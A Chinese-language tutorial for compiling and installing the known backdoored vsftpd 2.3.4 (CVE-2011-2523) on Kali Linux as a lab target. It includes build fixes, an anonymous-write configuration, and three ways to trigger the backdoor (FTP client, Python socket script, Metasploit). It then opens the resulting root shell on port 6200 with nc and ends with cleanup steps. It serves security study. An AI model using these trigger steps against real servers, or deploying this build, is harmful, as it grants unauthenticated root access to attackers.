# vsftpd 2.3.4 後門版安裝教學 (Kali Linux)

## 簡介

vsftpd 2.3.4 存在一個知名的後門漏洞 [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)。當使用者名稱結尾為 `:)` 時，會觸發後門，在 6200 埠開啟一個未認證的 shell。

本教學說明如何在 Kali Linux 上編譯並安裝這個帶有後門的版本。

---

## 前置需求

- Kali Linux 系統
- 網路連線
- root 權限

---

## 安裝步驟

### 1. 安裝編譯依賴

```bash
sudo apt update
sudo apt install -y git build-essential libcrypt-dev libcap-dev
```

### 2. 克隆後門版原始碼

```bash
git clone https://github.com/nikdubois/vsftpd-2.3.4-infected
cd vsftpd-2.3.4-infected
```

### 3. 建立必要目錄

```bash
sudo mkdir -p /usr/local/man/man8 /usr/local/man/man5
chmod a+x vsf_findlibs.sh
```

### 4. 修改 sysdeputil.h

在 `sysdeputil.h` 檔案第 75 行（在 `#endif` 之前）新增函數宣告：

```c
int vsf_sysutil_extra();
```

**完整修改後的檔案結尾：**

```c
int vsf_sysutil_getpid_nocache();
int vsf_sysutil_extra();

#endif /* VSF_SYSDEPUTIL_H */
```

### 5. 修改 vsf_findlibs.sh

將第 74 行的 `exit 0;` 改為：

```bash
echo "-lcrypt -lcap";
exit 0;
```

### 6. 編譯

```bash
make clean
make
```

如果編譯成功，會在当前目录生成 `vsftpd` 執行檔。

### 7. 安裝

```bash
sudo make install
```

### 8. 建立 FTP 用戶

```bash
sudo useradd -m -d /usr/share/empty -s /usr/sbin/nologin ftp
```

### 9. 設定 vsftpd.conf

確認 `/etc/vsftpd.conf` 內容包含以下設定：

```properties
listen=YES
anonymous_enable=YES
local_enable=YES
write_enable=YES
```

### 10. 啟動伺服器

```bash
sudo /usr/local/sbin/vsftpd /etc/vsftpd.conf
```

---

## 測試後門

### 方法一：使用 FTP 客戶端

```bash
# 安裝 ftp 客戶端（如果還沒有的話）
sudo apt install ftp

# 連線到 FTP 伺服器，使用者名稱結尾為 :)
ftp localhost
Name: anonymous:)
Password: anything

# 登入成功後不要做任何操作
```

### 方法二：使用 Python 腳本

```python
#!/usr/bin/env python3
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 21))

# 接收歡迎訊息
print(s.recv(1024).decode())

# 發送帶有後門觸發的使用者名稱
s.send(b'USER anonymous:)\r\n')
print(s.recv(1024).decode())

s.close()
```

### 方法三：使用 Metasploit

```bash
msfconsole
search vsftpd
use 1
set RHOSTS 127.0.0.1
run
```

---

## 連接後門 Shell

在另一個終端機，連接到 6200 埠：

```bash
nc -nv 127.0.0.1 6200
```

如果成功，你會獲得一個 root shell。

---

## 驗證後門是否存在

```bash
# 查看 binary 中是否包含後門函數
strings /usr/local/sbin/vsftpd | grep vsf_sysutil_extra

# 應該輸出包含 vsf_sysutil_extra
```

---

## 清理與移除

```bash
# 停止 vsftpd 服務
sudo pkill vsftpd

# 移除安裝
cd vsftpd-2.3.4-infected
sudo make uninstall

# 移除用戶
sudo userdel ftp

# 移除原始碼目錄
cd ..
rm -rf vsftpd-2.3.4-infected
```

---

## 注意事項

> ⚠️ **警告**：此教學僅用於資訊安全研究與教育目的。請勿在未經授權的系統上使用後門程式。未經授權的後門植入可能違反法律。

---

## 參考資源

- [CVE-2011-2523 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
- [vsftpd 2.3.4 Backdoor Analysis](https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html)
- [原始後門程式碼 Repository](https://github.com/nikdubois/vsftpd-2.3.4-infected)
